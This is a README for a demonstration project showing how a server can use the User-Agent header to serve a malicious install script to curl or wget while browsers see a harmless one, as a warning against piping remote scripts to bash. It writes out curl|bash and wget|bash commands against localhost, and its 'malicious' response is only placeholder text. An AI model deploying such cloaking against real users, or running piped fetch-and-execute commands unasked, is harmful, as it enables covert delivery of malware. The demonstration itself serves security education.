# pipe-to-bash
Piping install scripts you find on the internet to bash is a big security risk, yet many projects/vendors suggests this practice. This is a simple example showing why `curl/wget https://not-malicious.com/install.sh | bash` is bad and how you can get fooled even though you inspect the payload in the browser before executing it.

By using the `User-Agent` header we detect whether or not the call is coming from `curl` or `wget` commonly used when piping to bash, if so we supply the malicious payload. If the user is using any other `User-Agent` (such as Chrome, Firefox, etc) we will show a non-malicious install script.

## Run it
You can either use the binary in the root
```
./pipe-to-bash
```
or use `cargo`
```
cargo run
```

## Malicious
### Request
```
# wget -qO - http://localhost:3000/install.sh | bash, yields the same result

curl -sSL http://localhost:3000/install.sh | bash
```

### Response
```
Execute all the things, install malware, exfiltrate secrets, etc
```

## Non-malicious

### Request
```
curl -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0" -sSL http://localhost:3000/install.sh | bash
```
### Response
```
Fake install script, shown if you are not using wget/curl
```